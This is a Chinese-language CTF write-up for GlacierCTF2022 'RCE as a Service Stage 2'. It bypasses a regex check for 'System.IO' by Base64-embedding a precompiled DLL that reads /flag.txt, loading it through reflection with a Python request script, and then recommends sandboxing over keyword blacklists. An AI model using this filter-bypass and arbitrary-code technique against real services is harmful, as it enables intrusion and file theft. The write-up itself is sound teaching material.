# GlacierCTF2022 - RCE as a Service Stage 2

## 题目简述

第二阶段仍会编译并执行用户 C# lambda，只是在编译前用正则检查请求字符串是否含 `System.IO`。目标是在 Query 文本中不出现该字面量的情况下，调用文件读取代码。

## 解题过程

防护只有一条大小写敏感的文本匹配：

```csharp
if (Regex.IsMatch(query, "System.IO")) {
    throw new Exception("System.IO is not in the edge-computing file");
}
```

把真正的文件操作移入预先编译的 .NET 6 类库：

```csharp
public static class FlagReader
{
    public static string ReadFlag()
    {
        return System.IO.File.ReadAllText("/flag.txt");
    }
}
```

编译 `ReadFlag.dll` 后，将其字节做 Base64。Query 本身只负责解码、动态加载程序集并通过反射调用方法，因此源码文本中没有 `System.IO`：

```python
import base64
from pathlib import Path
import requests

dll = base64.b64encode(Path("ReadFlag.dll").read_bytes()).decode()
query = (
    "(data) => data.Select((d) => { "
    f'var dll = "{dll}"; '
    "var raw = Convert.FromBase64String(dll); "
    "var assembly = AppDomain.CurrentDomain.Load(raw); "
    'var type = assembly.GetType("FlagReader"); '
    'var method = type.GetMethod("ReadFlag"); '
    "return method.Invoke(null, null); })"
)

response = requests.post(
    "https://target/rce",
    json={"Data": ["placeholder"], "Query": query},
)
print(response.json())
```

文件 API 的 IL 和类型引用只存在于 Base64 DLL 内，文本正则无法识别。动态加载后方法在服务进程权限下执行，返回：

```text
glacierctf{L1V1N_ON_TH3_3DG3}
```

## 方法总结

对源码字符串做关键字黑名单无法限制通用编译与反射环境：代码可以被编码、拆分、反射调用或放进另一个程序集。第二阶段的正确安全边界仍应是删除任意编译能力，改用受限 DSL；若必须执行不可信代码，还需要独立进程、最小文件权限和系统级沙箱。
